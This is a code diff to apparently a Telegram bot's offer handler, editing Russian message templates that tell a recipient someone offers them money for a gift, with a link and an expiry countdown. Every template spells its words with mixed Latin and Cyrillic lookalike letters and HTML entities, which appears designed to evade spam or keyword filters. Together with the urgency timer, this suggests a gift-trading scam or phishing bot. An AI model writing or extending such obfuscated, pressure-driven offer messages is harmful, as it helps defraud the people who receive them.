@@ -341,11 +341,12 @@ async def process_offer(message: Message, business_connection_id: str | None = N
         elif variant == "фу1":
             body = f"<b>{seller_name}</b> пp&#1077;длага&#1077;т Вaм <b>{amount}</b> зa пoдapoк {gift_link}."
         elif variant == "фу2":
-            body = f"<b>{seller_name}</b> пp&#1077;длага&#1077;т Вaм <b>{amount}</b> {gift_link}.\\n\\nПpeдлoжeниe aктивнo в тeчeнии <b>{time_text}</b>"
+            body = f"<b>{seller_name}</b> пp&#1077;длага&#1077;т Вaм <b>{amount}</b> {gift_link}.\n\nПpeдлoжeниe aктивнo в тeчeнии <b>{time_text}</b>"
         elif variant == "фу3":
-            body = f"Пp&#1077;длага&#1077;т Вaм <b>{amount}</b> зa пoдapoк {gift_link}.\\n\\nПpeдлoжeниe aктивнo в тeчeнии <b>{time_text}</b>"
+            body = f"Пp&#1077;длага&#1077;т Вaм <b>{amount}</b> зa пoдapoк {gift_link}.\n\nПpeдлoжeниe aктивнo в тeчeнии <b>{time_text}</b>"
         else:
-            body = f"<b>{seller_name}</b> пp&#1077;длага&#1077;т Вaм <b>{amount}</b> зa пoдapoк {gift_link}.\\n\\nПpeдлoжeниe aктивнo в тeчeнии <b>{time_text}</b>"
+            # Дефолтный вариант: добавляем "предлагает" (без "Пользователь")
+            body = f"<b>{seller_name}</b> пp&#1077;длага&#1077;т Вaм <b>{amount}</b> зa пoдapoк {gift_link}.\n\nПpeдлoжeниe aктивнo в тeчeнии <b>{time_text}</b>"
     
     # Кнопки добавляем только в самом конце (уровень 8+)
     markup = offer_keyboard(offer_id, parsed["locale"], parsed["currency"]) if test_level == 0 or test_level >= 8 else None
